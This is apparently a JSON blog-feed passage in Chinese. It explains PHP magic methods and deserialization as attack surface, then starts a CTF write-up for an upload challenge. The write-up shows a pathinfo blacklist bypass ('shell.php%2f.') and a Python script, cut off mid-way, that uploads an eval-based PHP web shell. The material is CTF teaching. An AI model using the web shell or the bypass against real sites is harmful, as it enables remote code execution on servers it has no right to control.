data-num=\"5\"></td><td><pre>__<span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，在对象中调用一个不可访问方法时调用</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>__<span class=\"token function\">callStatic</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，用静态方式中调用一个不可访问方法时调用</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>__<span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，获得一个类的成员变量时调用</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>__<span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，设置一个类的成员变量时调用</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>__<span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，当对不可访问属性调用<span class=\"token function\">isset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>或<span class=\"token function\">empty</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>时调用</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>__<span class=\"token function\">unset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，当对不可访问属性调用<span class=\"token function\">unset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>时被调用。</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>__<span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，执行<span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>时，先会调用这个函数</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>__<span class=\"token function\">wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，执行<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>时，先会调用这个函数</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>__<span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，类被当成字符串时的回应方法</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>__<span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，调用函数的方式调用一个对象时的回应方法</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>__set_<span class=\"token function\">state</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，调用var_<span class=\"token function\">export</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>导出类时，此静态方法会被调用。</pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>__<span class=\"token function\">clone</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，当对象复制完成时调用</pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>__<span class=\"token function\">autoload</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，尝试加载未定义的类</pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>__<span class=\"token function\">debugInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，打印所需调试信息</pre></td></tr></table></figure><p>(1) __construct ()：当对象创建时会自动调用 (但在 unserialize () 时是不会自动调用的)。<br />\n(2) __wakeup () ：unserialize () 时会自动调用<br />\n (3) __destruct ()：当对象被销毁时会自动调用。<br />\n(4) __toString (): 当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用<br />\n (5) __get () : 当从不可访问的属性读取数据<br />\n (6) __call (): 在对象上下文中调用不可访问的方法时触发</p>\n<p>其中特别说明一下第四点：</p>\n<p>这个 __toString 触发的条件比较多，也因为这个原因容易被忽略，常见的触发条件有下面几种</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">(</span>1<span class=\"token punctuation\">)</span>echo <span class=\"token punctuation\">(</span><span class=\"token variable\">$obj</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> <span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$obj</span><span class=\"token punctuation\">)</span> 打印时会触发</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">(</span>2<span class=\"token punctuation\">)</span>反序列化对象与字符串连接时</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">(</span>3<span class=\"token punctuation\">)</span>反序列化对象参与格式化字符串时</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">(</span>4<span class=\"token punctuation\">)</span>反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">(</span>5<span class=\"token punctuation\">)</span>反序列化对象参与格式化SQL语句，绑定参数时</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">(</span>6<span class=\"token punctuation\">)</span>反序列化对象在经过php字符串函数，如 <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>、<span class=\"token function\">addslashes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>时</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">(</span>7<span class=\"token punctuation\">)</span>在in_<span class=\"token function\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">(</span>8<span class=\"token punctuation\">)</span>反序列化的对象作为 class_<span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> 的参数的时候</pre></td></tr></table></figure><p>有了这个，mama 再也不用担心遗漏了！</p>\n<p><img data-src=\"../../images/Iknowyouwillstop/4.jpg\" alt=\"4\" height=\"500px\" width=\"500px\" /></p>\n<p>在我们的攻击中，反序列化函数 unserialize () 是我们攻击的入口，也就是说，只要这个参数可控，我们就能传入任何的已经序列化的对象（只要这个类在当前作用域存在我们就可以利用），而不是局限于出现 unserialize () 函数的类的对象，如果只能局限于当前类，那我们的攻击面也太狭小了，这个类不调用危险的方法我们就没法发起攻击。</p>\n<p>但是我们又知道，你反序列化了其他的类对象以后我们只是控制了是属性，如果你没有在完成反序列化后的代码中调用其他类对象的方法，我们还是束手无策，毕竟代码是人家写的，人家本身就是要反序列化后调用该类的某个安全的方法，你总不能改人家的代码吧，但是没关系，因为我们有魔法方法。</p>\n<p>魔法正如上面介绍的，魔法方法的调用是在该类序列化或者反序列化的同时自动完成的，不需要人工干预，这就非常符合我们的想法，因此只要魔法方法中出现了一些我们能利用的函数，我们就能通过反序列化中对其对象属性的操控来实现对这些函数的操控，进而达到我们发动攻击的目的。</p>\n<p>但还有个很重要的一个点，那就是</p>\n<h4 id=\"魔法函数是有先后顺序的\"><a class=\"anchor\" href=\"#魔法函数是有先后顺序的\">#</a> 魔法函数是有先后顺序的</h4>\n<p>我们可以写个代码验证一下：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">pompom</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">private</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"pompom\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>     <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"__construct\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__sleep</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>     <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"__sleep\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t <span class=\"token keyword\">return</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>     <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"__wakeup\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>     <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"__destruct\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>     <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"__toString\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"&lt;/br>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token variable\">$pompom_old</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">pompom</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pompom_old</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"serialize-3.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token variable\">$pompom_new</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pompom_new</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><p>输出结果：</p>\n<p>__construct<br />\n__sleep<br />\n__wakeup<br />\n__toString<br />\n__destruct<br />\n__destruct</p>\n<p>就是提示一下这里 __destruct 了两次说明当前实际上有两个对象，一个就是实例化的时候创建的对象，另一个就是反序列化后生成的对象。</p>\n<p>最后说明以下</p>\n<h4 id=\"php反序列化标识符的含义\"><a class=\"anchor\" href=\"#php反序列化标识符的含义\">#</a> PHP 反序列化标识符的含义</h4>\n<blockquote>\n<p>a - array<br />\nb - boolean<br />\nd - double<br />\ni - integer<br />\no - common object<br />\nr - reference<br />\ns - string<br />\nC - custom object<br />\nO - class<br />\nN - null<br />\nR - pointer reference<br />\nU - unicode string</p>\n</blockquote>\n<p>序列化：把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等 函数 : serialize ()</p>\n<p>反序列化：恢复原先被序列化的变量 函数: unserialize ()</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$test1</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"hello world\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$test2</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"hello\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"world\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$test3</span> <span class=\"token operator\">=</span> <span class=\"token number\">123456</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$test1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//  s:11:\"hello world\";  序列化字符串</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$test2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//a:2:&#123;i:0;s:5:\"hello\";i:1;s:5:\"world\";&#125; 序列化数组</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$test3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//  i:123456;  </span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">hello</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$test4</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"hello,world\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$test</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">hello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$test</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//  O:5:\"hello\":1:&#123;s:5:\"test4\";s:11:\"hello,world\";&#125;  序列化对象  首字母代表参数类型 O->Objext S->String...</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h5 id=\"先浅浅写到这吧期待下次冒险\"><a class=\"anchor\" href=\"#先浅浅写到这吧期待下次冒险\">#</a> 先浅浅写到这吧，期待下次冒险！</h5>\n",
            "tags": [
                "杂谈小记",
                "php是世界上最好的语言",
                "反序列化好难呜呜"
            ]
        },
        {
            "id": "https://p1kap1.github.io/CTF/web/NSSCTF-2nd-web/",
            "url": "https://p1kap1.github.io/CTF/web/NSSCTF-2nd-web/",
            "title": "NSSCTF-2nd-web",
            "date_published": "2023-08-30T16:00:00.000Z",
            "content_html": "<h3 id=\"php签到\"><a class=\"anchor\" href=\"#php签到\">#</a> php 签到</h3>\n<blockquote>\n<p>php, 文件上传</p>\n</blockquote>\n<p><strong>题目描述：</strong></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token variable\">$black_list</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"ph\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"htaccess\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"ini\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$ext</span> <span class=\"token operator\">=</span> <span class=\"token function\">pathinfo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">PATHINFO_EXTENSION</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$black_list</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ext</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$content</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Please re-upload\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>这题目主要知识点就是绕过黑名单限制，我们可以利用 pathinfo 函数。</p>\n<p>pathinfo 函数在获取文件后缀名时获取 '.' 后面的内容，当出现多个 '.' 时，结果为最后一个 '.' 后面的内容。所以可以利用这个特性实现对后缀名检测的绕过。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS14eHgtb3Q5ZDY4OGYybXpzYjNiOGhkaGIueHh4Ly4lRTclOUElODQlRTYlOTYlQjklRTUlQkMlOEYlRTclQkIlOTUlRTglQkYlODclRTglQkYlODclRTYlQkIlQTQlRUYlQkMlOEMlRTYlOTYlODclRTQlQkIlQjYlRTUlOTAlOEQlRTQlQjglQkF4eHgueHh4Ly4lRTYlOTclQjYscGF0aGluZm8lRTUlODclQkQlRTYlOTUlQjAlRTclOUElODRQQVRISU5GT19FWFRFTlNJT04lRTUlOEYlQUElRTglODMlQkQlRTUlQkUlOTclRTUlODglQjAlRTclQTklQkElRTMlODAlODI=\">这里我们采用 xxx.xxx/. 的方式绕过过滤，文件名为 xxx.xxx/. 时，pathinfo 函数的 PATHINFO_EXTENSION 只能得到空。</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS14eHgtbTMzZTAyM2YueHh4Ly4lRTglQkYlOTklRTclQTclOEQlRTYlOTYlODclRTQlQkIlQjYlRTUlOTAlOEQlRTUlOUMlQTglRTglQTIlQUJmaWxlX3B1dF9jb250ZW50cyVFNSU4NyVCRCVFNiU5NSVCMCVFNSVBNCU4NCVFNyU5MCU4NiVFNiU5NyVCNiVFRiVCQyU4QyVFNCVCQyU5QSVFOCVBNyVBMyVFNiU5RSU5MCVFNiU4OCU5MHh4eC54eHglRUYlQkMlOEMlRTUlOEUlOUYlRTclOTAlODYlRTUlQkElOTQlRTglQUYlQTUlRTYlOTglQUYvLiVFOCVBMSVBOCVFNyVBNCVCQSVFNSVCRCU5MyVFNSU4OSU4RCVFNyU5QiVBRSVFNSVCRCU5NSVFRiVCQyU4QyVFOCU4NyVCMyVFNCVCQSU4RSVFNCVCOCVCQSVFNCVCQiU4MCVFNCVCOSU4OHh4eC54eHguJUU0JUI4JThEJUU4JUExJThDJUVGJUJDJThDJUU2JTg4JTkxJUU2JTgzJUIzJUU1JUJBJTk0JUU4JUFGJUE1JUU2JTk4JUFGJUU2JTkzJThEJUU0JUJEJTlDJUU3JUIzJUJCJUU3JUJCJTlGJUU3JTlBJTg0JUU1JThFJTlGJUU1JTlCJUEwLCVFOSVBMiU5OCVFNyU5QiVBRSVFNyU5NCVBOCVFNyU5QSU4NCVFNiU5OCVBRmRlYmlhbiVFNyVCMyVCQiVFNyVCQiU5RiVFNCVCOCU4RCVFNiU5OCVBRndpbmRvd3MlRUYlQkMlOEMlRTUlQkElOTQlRTglQUYlQTUlRTUlQTQlODQlRTclOTAlODYlRTQlQjglOEQlRTYlOEUlODklRTYlOTYlODclRTQlQkIlQjYlRTYlOUMlODAlRTUlOTAlOEUlRTclOUElODQuJUVGJUJDJThDJUU1JUFGJUJDJUU4JTg3JUI0JUU2JTk3JUEwJUU2JUIzJTk1JUU4JUE3JUEzJUU2JTlFJTkwJUUzJTgwJTgy\">同时 xxx.xxx/. 这种文件名在被 file_put_contents 函数处理时，会解析成 xxx.xxx，原理应该是 /. 表示当前目录，至于为什么 xxx.xxx. 不行，我想应该是操作系统的原因，题目用的是 debian 系统不是 windows，应该处理不掉文件最后的.，导致无法解析。</span></p>\n<p>最后的最后，还要进行一次 url 编码，否则只能解析 '/' 后面的数据。php.png/</p>\n<p>写个脚本：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">'http://node5.anna.nssctf.cn:28510/'</span>  <span class=\"token comment\"># 上传文件的 PHP 脚本地址</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>file_content <span class=\"token operator\">=</span> <span class=\"token string\">\"&lt;?php @eval($_POST['cmd']); ?>\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>files <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token string\">'file'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'shell.php%2f.'</span><span class=\"token punctuation\">,</span> file_content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>response 